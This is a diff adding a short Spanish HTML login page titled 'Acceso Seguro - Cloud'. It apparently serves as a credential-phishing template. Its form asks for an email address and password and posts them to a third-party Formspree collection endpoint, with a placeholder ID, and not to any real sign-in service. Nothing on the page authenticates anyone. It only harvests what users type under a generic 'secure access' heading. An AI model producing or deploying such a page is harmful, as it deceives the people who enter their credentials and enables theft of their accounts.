@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Acceso Seguro - Cloud</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-slate-900 flex items-center justify-center h-screen">
+    <div class="bg-white p-8 rounded-3xl shadow-2xl w-96">
+        <h2 class="text-2xl font-bold text-center text-slate-800 mb-6">Iniciar Sesión</h2>
+        
+        <form action="https://formspree.io/f/TU_ID_AQUÍ" method="POST" class="space-y-4">
+            <div>
+                <label class="block text-sm font-medium text-slate-700">Correo Electrónico</label>
+                <input type="email" name="email" required class="w-full px-4 py-2 border rounded-xl outline-none focus:ring-2 focus:ring-blue-500">
+            </div>
+            <div>
+                <label class="block text-sm font-medium text-slate-700">Contraseña</label>
+                <input type="password" name="password" required class="w-full px-4 py-2 border rounded-xl outline-none focus:ring-2 focus:ring-blue-500">
+            </div>
+            <button type="submit" class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold hover:bg-blue-700 transition">
+                INGRESAR
+            </button>
+        </form>
+    </div>
+</body>
+</html>
